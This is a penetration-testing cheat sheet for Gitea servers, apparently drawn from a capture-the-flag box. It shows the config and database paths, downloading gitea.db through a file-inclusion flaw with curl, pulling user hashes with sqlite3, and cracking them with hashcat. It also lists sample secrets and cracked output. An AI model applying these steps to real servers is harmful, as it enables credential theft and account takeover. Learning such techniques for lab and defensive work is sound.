# Gitea

Gitea is a self-hosted Git service similar to GitHub/GitLab. It stores user credentials and may expose sensitive repository data.

---

## Discovery

```bash
# Default port: 3000

# Version disclosure at bottom of page
# "Powered by Gitea Version: 1.22.1"

# Check for public repositories
http://TARGET:3000/explore/repos
```

---

## Enumeration

### Docker Configuration

If Gitea runs in Docker, check docker-compose.yml for mount paths:

```yaml
volumes:
  - /home/developer/gitea/data:/data  # Host path : Container path
```

This means files at `/data/...` in container are at `/home/developer/gitea/data/...` on host.

### Important Files

```bash
# Config file (location varies based on install)
/data/gitea/conf/app.ini              # Docker default
/etc/gitea/app.ini                    # Package install
/var/lib/gitea/custom/conf/app.ini    # Alternative

# With LFI, translate Docker paths to host paths using mount info
/home/developer/gitea/data/gitea/conf/app.ini

# Database
/data/gitea/gitea.db                  # Docker
/var/lib/gitea/data/gitea.db          # Alternative
```

### Finding Config Path via Docker

```bash
# Pull same container version locally
docker pull gitea/gitea:1.22.1
docker run -d --name=gitea -p 3000:3000 gitea/gitea:1.22.1

# Find config inside container
docker exec -it gitea /bin/bash
find / -type f -name app.ini 2>/dev/null
# /data/gitea/conf/app.ini
```

---

## app.ini Secrets

```ini
[security]
SECRET_KEY = <app secret>
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g

[server]
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4

[database]
PATH = /data/gitea/gitea.db
```

---

## Extracting Credentials from gitea.db

```bash
# Download database via LFI
curl -v 'http://TARGET/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db

# Verify
file gitea.db
# gitea.db: SQLite 3.x database

# Extract users
sqlite3 gitea.db
SELECT lower_name, email, passwd, salt FROM user;
```

### User Table Output

```
administrator|root@titanic.htb|cba20ccf927d3ad0567b68161732d3fb...|2d149e5fbd1b20cf31db3e3c6a28fc9b
developer|developer@titanic.htb|e531d398946137baea70ed6a680a5438...|8bf3e3452b78544f8bee9400d6936d34
```

---

## Cracking Gitea Password Hashes

Gitea uses PBKDF2-HMAC-SHA256 (hashcat mode 10900).

### Using gitea2hashcat

```bash
# Tool: https://github.com/hashcat/hashcat/blob/master/tools/gitea2hashcat.py
wget https://raw.githubusercontent.com/hashcat/hashcat/master/tools/gitea2hashcat.py

# Format: salt:hash
echo "8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56" > hashes.txt

# Convert to hashcat format
python3 gitea2hashcat.py "8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56"

# Output:
# sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

### Cracking with Hashcat

```bash
# Save converted hash
echo "sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=" > hashcat_hashes.txt

# Crack
hashcat -m 10900 hashcat_hashes.txt /usr/share/wordlists/rockyou.txt

# Result:
# sha256:50000:...:25282528
```

---

## Useful Paths

| Path | Description |
|------|-------------|
| `/data/gitea/conf/app.ini` | Main config (Docker) |
| `/data/gitea/gitea.db` | SQLite database |
| `/data/git/repositories/` | Git repositories |
| `/data/gitea/sessions/` | Session files |
| `/data/gitea/jwt/private.pem` | JWT private key |
